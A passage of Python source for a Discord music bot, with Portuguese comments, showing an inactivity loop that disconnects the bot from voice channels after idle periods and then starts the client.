            # Verifica se o bot está tocando ou pausado
            is_playing = guild.voice_client.is_playing() or guild.voice_client.is_paused()
            
            # Verifica se o bot está sozinho no canal de voz
            members_in_voice = len(voice_channel.members) if voice_channel else 0
            is_alone = members_in_voice <= 1  # 1 porque o bot conta como um membro
            
            # Se estiver tocando ou pausado, atualiza o tempo de atividade
            if is_playing:
                last_activity[guild_id] = discord.utils.utcnow()
                continue
            
            # Se o bot estiver sozinho no canal de voz por mais de 1 minuto, desconecta
            if is_alone:
                if (discord.utils.utcnow() - last_activity[guild_id]).total_seconds() > 60:  # 1 minuto
                    await disconnect(guild)
                    registrar_log(f"Desconectado por inatividade.", 'info')
                    del last_activity[guild_id]
                    continue
            
            # Se não estiver tocando e não estiver sozinho, verifica o tempo de inatividade
            if (discord.utils.utcnow() - last_activity[guild_id]).total_seconds() > 180:  # 3 minutos
                await disconnect(guild)
                registrar_log(f"Desconectado por inatividade.", 'info')
                del last_activity[guild_id]

client.run(TOKEN)
# __   __   ______     __  __    
#/\ \ / /  /\___  \   /\ \/ /    
#\ \ \'/   \/_/  /__  \ \  _"-.  
# \ \__|     /\_____\  \ \_\ \_\ 
#  \/_/      \/_____/   \/_/\/_/ 
                                
